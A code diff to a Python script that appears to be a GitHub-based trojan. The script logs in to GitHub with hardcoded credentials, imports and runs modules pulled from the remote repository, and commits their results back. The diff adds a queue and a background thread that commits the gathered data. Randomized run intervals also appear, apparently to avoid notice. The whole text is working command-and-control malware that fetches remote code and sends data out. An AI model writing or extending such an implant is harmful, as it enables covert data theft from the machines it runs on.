@@ -9,6 +9,7 @@ data_path = 'data/%s/' % para_id
 modules = []
 configured = False #?
 task_queue = Queue.Queue()
+data_queue = Queue.Queue()
 
 def connect_to_github():
 	gh = login(username='acidwolves', password='yCrust23')
@@ -70,10 +71,11 @@ class GitImporter(object):
 
 def module_runner(module):
 	task_queue.put(1)
+	time.sleep(2) # we wanna give time to commit data
 	result, path = sys.modules[module].run()
 	task_queue.get()
 
-	store_module_result(result, path)
+	data_queue.put([result, path])
 	return
 
 def loop_module_runner(module, lapse, stop_event):
@@ -85,11 +87,23 @@ def loop_module_runner(module, lapse, stop_event):
 			randomized_lapse = random.randint(int(lapse), int(lapse) + int(int(lapse)*0.2))
 			stop_event.wait(randomized_lapse) # Similar to sleep but breaks on stop event set
 
+def data_commiter():
+	# This function is designed to be a thread's target and call the data storage module only if there are no
+	# modules running (so the commits don't conflict)
+	while 1:
+		if task_queue.empty() and not data_queue.empty():
+			print '[*] Storing data'
+			data = data_queue.get()
+			store_module_result(data[0], data[1])
+
 
 # Main loop
 sys.meta_path = [GitImporter()] # Here we assign our importer
 
 launched_modules = {}
+data_thread = threading.Thread(target=data_commiter)
+data_thread.start()
+
 
 while 1:
 	config = get_config()
